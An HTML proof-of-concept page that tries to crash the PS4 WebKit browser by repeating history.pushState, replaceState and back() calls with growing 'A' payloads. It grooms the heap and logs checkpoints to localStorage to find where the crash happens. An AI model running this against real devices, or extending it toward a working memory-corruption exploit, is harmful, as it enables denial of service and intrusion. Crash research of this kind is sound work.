<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit History Crash PoC</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
#log { white-space: pre-wrap; }
button { padding:10px; margin:10px; }
</style>
</head>

<body>

<h2>PS4 WebKit – History.pushState Crash (Instrumented)</h2>
<button onclick="run()">RUN</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");

function log(m){
    logEl.textContent += m + "\n";
}

/* =========================
   GLOBAL REUSED STATE
========================= */

let sharedState = {
    iter: 0,
    payload: "",
    marker: 0x41414141
};

let heap = [];

/* =========================
   CHECKPOINT HELPERS
========================= */

function checkpoint(iter, phase, size) {
    const msg = `ITER=${iter} PHASE=${phase} SIZE=${size}`;
    document.title = msg;                 // flush imediato
    localStorage.setItem("last", msg);     // persiste após crash
}

/* =========================
   CORE TEST
========================= */

function run() {
    log("[*] START");
    localStorage.setItem("last", "START");

    let size = 977;

    for (let i = 0; i < 50; i++) {
        sharedState.iter = i;
        sharedState.payload = "A".repeat(size);

        // heap grooming cumulativo real
        heap.push("G".repeat(1024 * 32));

        checkpoint(i, "BEFORE_PUSH", size);
        log("[ITER " + i + "] size=" + size);

        checkpoint(i, "PUSH", size);
        history.pushState(sharedState, "", "#" + sharedState.payload);

        checkpoint(i, "REPLACE", size);
        history.replaceState(sharedState, "", "#" + sharedState.payload);

        if (i % 2 === 0) {
            checkpoint(i, "BACK", size);
            history.back();
        }

        checkpoint(i, "END_ITER", size);

        size += 14461;
    }

    checkpoint(999, "END", 0);
    log("[*] END (no crash?)");
}
</script>

</body>
</html>

